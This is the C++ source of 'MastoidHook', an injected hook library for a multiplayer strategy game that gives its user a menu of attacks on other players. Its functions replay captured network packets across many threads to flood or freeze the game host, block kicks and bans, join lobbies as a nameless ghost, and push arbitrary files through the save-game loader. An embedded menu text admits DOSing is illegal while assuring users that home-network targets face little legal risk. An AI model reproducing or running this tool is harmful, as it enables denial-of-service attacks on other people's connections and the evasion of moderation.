#include <iostream>
#include <dlfcn.h>
#include <funchook.h>
#include <SDL2/SDL.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "imgui/imgui.h"
#include "imgui/imgui_impl_sdl.h"
#include "imgui/imgui_impl_opengl3.h"
#include "sdk.h"

typedef CAddPlayerCommand* (*CAddPlayerCommand_t)(CAddPlayerCommand* pThis, CString* a2, CString* a3, int a4, bool a5, long long a6);
CAddPlayerCommand_t o_CAddPlayerCommand;

typedef CRemovePlayerCommand* (*CRemovePlayerCommand_t)(void* pThis, int nMachineId, ERemovalReason eReason, long long a4);
CRemovePlayerCommand_t o_CRemovePlayerCommand;

typedef bool (*SendPacket_t)(_ENetHost **Handle, struct NetConnectionContextNETCONNECTION* ConnectionHandle, CBlob* pData, const unsigned int nDataSize, uint8_t nChannel);
SendPacket_t o_SendPacket;

typedef bool (*SendPacketToIndex_t)(_ENetHost **Handle, int nConnectionIndex, CBlob* pData, const unsigned int nDataSize, uint8_t nChannel);
SendPacketToIndex_t o_SendPacketToIndex;

typedef long long (*NetDisconnect_t)(long long a1);
NetDisconnect_t o_NetDisconnect;

typedef void (*MatchmakingLeaveLobby_t)(long long a1);
MatchmakingLeaveLobby_t o_MatchmakingLeaveLobby;

typedef long long (*SetState_t)(long long a1, unsigned int a2);
SetState_t o_SetState;

typedef bool (*LoadSaveGame_t)(void* pThis, CSaveGameMeta* Meta, CCountryTag* PlayerTag);
LoadSaveGame_t o_LoadSaveGame;

typedef bool (*AddFileExtensionIfNeeded_t)(void* pThis, CSaveFile* Meta, CString* Extension, CString* OutString);
AddFileExtensionIfNeeded_t o_AddFileExtensionIfNeeded;

typedef const Uint8* (*SDL_GetKeyboardState_t)(int *numkeys);
SDL_GetKeyboardState_t o_SDL_GetKeyboardState;

typedef void (*SDL_GL_SwapWindow_t)(SDL_Window* window);
SDL_GL_SwapWindow_t o_SDL_GL_SwapWindow;

typedef long long (*ImGui_ImplSDL2_NewFrame_t)(SDL_Window* window);
ImGui_ImplSDL2_NewFrame_t o_ImGui_ImplSDL2_NewFrame;

typedef ssize_t (*enet_socket_send_t)(int a1, long long a2, struct iovec *a3, size_t a4);
enet_socket_send_t o_enet_socket_send;

void* pCGameLobby;
_ENetHost** LastENetHost;
CBlob* FirstData;
CBlob* SwapData;
unsigned int iLargestPacketSize = 1;
unsigned int iFirstPacketSize = 1;
SDL_GLContext g_GLContext;
bool bRefuseDisconnect = false;
bool bMenuOpen = true;
bool bJoinAsGhost = true;
bool bHideSteamName = true;
bool bShouldDOS = false;
bool bShouldFreeze = false;
bool bShouldRecaptureFirstData = true;
char NameBuffer[64] = "filename";
char ExtensionBuffer[16] = ".hoi4";
CSaveGameMeta* DummyMeta;
const Uint8* MastoidKeyBoardState;

CAddPlayerCommand* hk_CAddPlayerCommand(CAddPlayerCommand* pThis, CString* a2, CString* a3, int a4, bool a5, long long a6)
{
	fputs("[MastoidHook] add player command\n", stdout);

	if (bJoinAsGhost)
	{
		a2->_str = "";
		a3->_str = "";
	}
	else if (bHideSteamName)
	{
		a2->_str = "";
	}

	return o_CAddPlayerCommand(pThis, a2, a3, a4, a5, a6);
}

CRemovePlayerCommand* hk_CRemovePlayerCommand(void* pThis, int nMachineId, ERemovalReason eReason, long long a4)
{
	fputs("[MastoidHook] remove player command\n", stdout);

	if (bShouldDOS)
	{
		bShouldDOS = false;

		fputs("[MastoidHook] dos attack stopped\n", stdout);
	}

	if (bShouldFreeze)
	{
		bShouldFreeze = false;

		fputs("[MastoidHook] freeze attack stopped\n", stdout);
	}

	bShouldRecaptureFirstData = true;
	bRefuseDisconnect = false;

	return o_CRemovePlayerCommand(pThis, nMachineId, eReason, a4);
}

bool hk_SendPacket(_ENetHost** Handle, struct NetConnectionContextNETCONNECTION* ConnectionHandle, CBlob* pData, const unsigned int nDataSize, uint8_t nChannel)
{
	return o_SendPacket(Handle, ConnectionHandle, pData, nDataSize, nChannel);
}

bool hk_SendPacketToIndex(_ENetHost** Handle, int nConnectionIndex, CBlob* pData, const unsigned int nDataSize, uint8_t nChannel)
{
	LastENetHost = Handle;

	if (bShouldRecaptureFirstData)
	{
		iFirstPacketSize = nDataSize;
		FirstData = pData;
		bShouldRecaptureFirstData = false;
	}

	if (nDataSize > iLargestPacketSize)
	{
		iLargestPacketSize = nDataSize;
		SwapData = pData;
	}

	return o_SendPacketToIndex(Handle, nConnectionIndex, pData, nDataSize, nChannel);
}

long long hk_NetDisconnect(long long a1)
{
	fputs("[MastoidHook] net disconnect\n", stdout);

	if (!bRefuseDisconnect)
		return o_NetDisconnect(a1);

	return 0;
}

void hk_MatchmakingLeaveLobby(long long a1)
{
	fputs("[MastoidHook] matchmaking leave lobby\n", stdout);

	if (!bRefuseDisconnect)
		o_MatchmakingLeaveLobby(a1);
}

long long hk_SetState(long long a1, unsigned int a2)
{
	fputs("[MastoidHook] csession set state\n", stdout);

	if (!bRefuseDisconnect)
		return o_SetState(a1, a2);

	return 0;
}

bool hk_LoadSaveGame(void* pThis, CSaveGameMeta* Meta, CCountryTag* PlayerTag)
{
	fputs("[MastoidHook] load save game\n", stdout);

	pCGameLobby = pThis;
	DummyMeta = Meta;

	return o_LoadSaveGame(pThis, Meta, PlayerTag);
}

bool hk_AddFileExtensionIfNeeded(void* pThis, CSaveFile* Meta, CString* Extension, CString* OutString)
{
	pCGameLobby = pThis;
	Extension->_str = ExtensionBuffer;

	o_AddFileExtensionIfNeeded(pThis, Meta, Extension, OutString);

	return true;
}

const Uint8* hk_SDL_GetKeyboardState(int* numkeys)
{
	MastoidKeyBoardState = o_SDL_GetKeyboardState(numkeys);

	return MastoidKeyBoardState;
}

void hk_SDL_GL_SwapWindow(SDL_Window* window)
{
	static bool init = false;
	static SDL_GLContext OriginalContext = SDL_GL_GetCurrentContext();

	if (!init)
	{
	    ImGui::CreateContext();
	    ImGuiIO& io = ImGui::GetIO();
	    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
	    io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange;
	    io.IniFilename = NULL;
	    ImGui::StyleColorsLight();
	    SDL_GL_MakeCurrent(window, OriginalContext);
	    ImGui_ImplSDL2_InitForOpenGL(window, OriginalContext);
	    ImGui_ImplOpenGL3_Init("#version 150");
	}

	if (bMenuOpen)
	{
	    ImGui_ImplOpenGL3_NewFrame();
	    o_ImGui_ImplSDL2_NewFrame(window);
	    ImGui::NewFrame();

	    ImGui::SetNextWindowSize(ImVec2(300, 503));
		ImGui::Begin("MastoidHook 3 SOCKET EDITION", &bMenuOpen);

		ImGui::Checkbox("Anti-Ban", &bRefuseDisconnect);
		ImGui::Checkbox("Join As Ghost", &bJoinAsGhost);
		ImGui::Checkbox("Hide Steam Name", &bHideSteamName);

		ImGui::Text("\nNetworking");
		if (ImGui::Button("DOS Host", ImVec2(285, 28)))
		{
			bShouldDOS = !bShouldDOS;

			fputs(bShouldDOS ? "[MastoidHook] dos attack started\n" : "[MastoidHook] dos attack stopped\n", stdout);
		}

		if (ImGui::Button("Freeze Host", ImVec2(285, 28)))
		{
			bShouldFreeze = !bShouldFreeze;

			fputs(bShouldFreeze ? "[MastoidHook] freeze attack started\n" : "[MastoidHook] freeze attack stopped\n", stdout);
		}

		ImGui::Text("\nFile Transfer");
		ImGui::SetNextItemWidth(120.f);
		ImGui::InputText("File Name", NameBuffer, IM_ARRAYSIZE(NameBuffer));
		ImGui::SetNextItemWidth(120.f);
		ImGui::InputText("Extension", ExtensionBuffer, IM_ARRAYSIZE(ExtensionBuffer));
		if (ImGui::Button("Upload", ImVec2(285, 28)))
		{
			std::string sNameBuffer = NameBuffer;
			std::string sExtensionBuffer = ExtensionBuffer;

			if (sNameBuffer.length() > 0 && sExtensionBuffer.length() > 0)
			{
				CCountryTag* NewTag = new CCountryTag;

				NewTag->_nLinkIndex = 1;
				DummyMeta->_SaveName._str = sNameBuffer + sExtensionBuffer;

				o_LoadSaveGame(pCGameLobby, DummyMeta, NewTag);
			}
		}

		ImGui::TextWrapped("\nI shouldn't have to tell you that DOSing/DDOSing is illegal. With that said though, it is extremely rare for any legal action to even be ATTEMPTED against someone that targets home networks only. Local law enforcement does not bother to investigate reports of someone's home network going offline for a few minutes because they don't have the resources to, nor do they care. It's only feasible for law enforement to protect corporations suffering from attacks lasting for extended periods of time.");

	    ImGui::End();
	    ImGui::Render();
	    ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
	}

	o_SDL_GL_SwapWindow(window);
}

void Mastoid_SendDOS()
{
	if (bShouldDOS)
	{
		bool reply = o_SendPacketToIndex(LastENetHost, 0, FirstData, iFirstPacketSize, 0);

		if (!reply)
			fputs("[MastoidHook] host failed to reply to dos packet\n", stdout);
	}
}

void* Mastoid_Input(void* a1) //https://wiki.libsdl.org/SDL_Scancode
{
	bool bKeyPressed = false;

	while (true)
	{
		Mastoid_SendDOS(); //this is here to maximize thread usage for sending out packets

		if (MastoidKeyBoardState && MastoidKeyBoardState[SDL_SCANCODE_INSERT] && !bKeyPressed) 
		{
			bMenuOpen = !bMenuOpen;
			bKeyPressed = true;
		}	
		else
		{
			bKeyPressed = false;
		}

		usleep(75000);
	}
}

void* Mastoid_DOS(void* a1)
{
	while (true)
	{
		Mastoid_SendDOS();
	}
}

/*separate function from Mastoid_DOS because we only want 1 thread for freezing. too much power could
end up taking a target with bad internet offline, which at that point we're not freezing their game anymore.
maybe there is a better way to implement this without declaring a separate function that also does not sacrifice any performance.
faster processing of these threads = more packets sent out.*/
void* Mastoid_DOSFreeze(void* a1)
{
	while (true)
	{
		Mastoid_SendDOS();
		
		if (bShouldFreeze)
		{
			bool reply = o_SendPacketToIndex(LastENetHost, 0, SwapData, 1, 0);

			if (!reply)
				fputs("[MastoidHook] host failed to reply to freeze packet\n", stdout);
		}
	}
}

int __attribute__ ((constructor)) Mastoid_Main()
{
	fputs("[MastoidHook] loaded\n", stdout);

    funchook_t* funchook = funchook_create();
    int UsableThreads = sysconf(_SC_NPROCESSORS_ONLN) - 2;
    pthread_t threads[UsableThreads];

	o_CAddPlayerCommand = reinterpret_cast<CAddPlayerCommand_t>(dlsym(RTLD_DEFAULT, "_ZN17CAddPlayerCommandC2ERK7CStringS2_ibRK18CPdxSocialPlayerId"));
	o_CRemovePlayerCommand = reinterpret_cast<CRemovePlayerCommand_t>(dlsym(RTLD_DEFAULT, "_ZN20CRemovePlayerCommandC2EiNS_14ERemovalReasonERK18CPdxSocialPlayerId"));
	o_SendPacket = reinterpret_cast<SendPacket_t>(dlsym(RTLD_DEFAULT, "NetSendPacket"));
	o_SendPacketToIndex = reinterpret_cast<SendPacketToIndex_t>(dlsym(RTLD_DEFAULT, "NetSendPacketToIndex"));
	o_NetDisconnect = reinterpret_cast<NetDisconnect_t>(dlsym(RTLD_DEFAULT, "NetDisconnect"));
	o_MatchmakingLeaveLobby = reinterpret_cast<MatchmakingLeaveLobby_t>(dlsym(RTLD_DEFAULT, "_Z21MatchmakingLeaveLobbyP29MatchmakingContextMATCHMAKING"));
	o_SetState = reinterpret_cast<SetState_t>(dlsym(RTLD_DEFAULT, "_ZN8CSession8SetStateE13ESessionState"));
	o_LoadSaveGame = reinterpret_cast<LoadSaveGame_t>(dlsym(RTLD_DEFAULT, "_ZN10CGameLobby12LoadSaveGameERK13CSaveGameMetaRK11CCountryTag"));
	o_AddFileExtensionIfNeeded = reinterpret_cast<AddFileExtensionIfNeeded_t>(dlsym(RTLD_DEFAULT, "_ZNK10CGameLobby24AddFileExtensionIfNeededERK9CSaveFileRK7CStringRS3_"));
	o_SDL_GetKeyboardState = reinterpret_cast<SDL_GetKeyboardState_t>(dlsym(RTLD_DEFAULT, "SDL_GetKeyboardState"));
	o_SDL_GL_SwapWindow = reinterpret_cast<SDL_GL_SwapWindow_t>(dlsym(RTLD_DEFAULT, "SDL_GL_SwapWindow"));
	o_ImGui_ImplSDL2_NewFrame = reinterpret_cast<ImGui_ImplSDL2_NewFrame_t>(dlsym(RTLD_DEFAULT, "_Z23ImGui_ImplSDL2_NewFrameP10SDL_Window")); //grabbing a static offset required as this is the only symbol unable to be auto resolved

	printf("[MastoidHook] o_CAddPlayerCommand %p\n", o_CAddPlayerCommand);
	printf("[MastoidHook] o_CRemovePlayerCommand %p\n", o_CRemovePlayerCommand);
	printf("[MastoidHook] o_SendPacket %p\n", o_SendPacket);
	printf("[MastoidHook] o_SendPacketToIndex %p\n", o_SendPacketToIndex);
	printf("[MastoidHook] o_MatchmakingLeaveLobby %p\n", o_MatchmakingLeaveLobby);
	printf("[MastoidHook] o_SetState %p\n", o_SetState);
	printf("[MastoidHook] o_LoadSaveGame %p\n", o_LoadSaveGame);
	printf("[MastoidHook] o_AddFileExtensionIfNeeded %p\n", o_AddFileExtensionIfNeeded);
	printf("[MastoidHook] o_SDL_GetKeyboardState %p\n", o_SDL_GetKeyboardState);
	printf("[MastoidHook] o_SDL_GL_SwapWindow %p\n", o_SDL_GL_SwapWindow);
	printf("[MastoidHook] o_ImGui_ImplSDL2_NewFrame %p\n", o_ImGui_ImplSDL2_NewFrame);

	funchook_prepare(funchook, (void**)&o_CAddPlayerCommand, (void*)hk_CAddPlayerCommand);
	funchook_prepare(funchook, (void**)&o_CRemovePlayerCommand, (void*)hk_CRemovePlayerCommand);
	funchook_prepare(funchook, (void**)&o_SendPacket, (void*)hk_SendPacket);
	funchook_prepare(funchook, (void**)&o_SendPacketToIndex, (void*)hk_SendPacketToIndex);
	funchook_prepare(funchook, (void**)&o_NetDisconnect, (void*)hk_NetDisconnect);
	funchook_prepare(funchook, (void**)&o_MatchmakingLeaveLobby, (void*)hk_MatchmakingLeaveLobby);
	funchook_prepare(funchook, (void**)&o_SetState, (void*)hk_SetState);
	funchook_prepare(funchook, (void**)&o_LoadSaveGame, (void*)hk_LoadSaveGame);
	funchook_prepare(funchook, (void**)&o_AddFileExtensionIfNeeded, (void*)hk_AddFileExtensionIfNeeded);
	funchook_prepare(funchook, (void**)&o_SDL_GetKeyboardState, (void*)hk_SDL_GetKeyboardState);
	funchook_prepare(funchook, (void**)&o_SDL_GL_SwapWindow, (void*)hk_SDL_GL_SwapWindow);
	funchook_install(funchook, 0);

	pthread_create(&threads[1], NULL, &Mastoid_Input, NULL);
	pthread_create(&threads[2], NULL, &Mastoid_DOSFreeze, NULL);

	for (int i = 2; i < UsableThreads; i++) 
	{
		pthread_create(&threads[i], NULL, &Mastoid_DOS, NULL);
	}

	return 0;
}
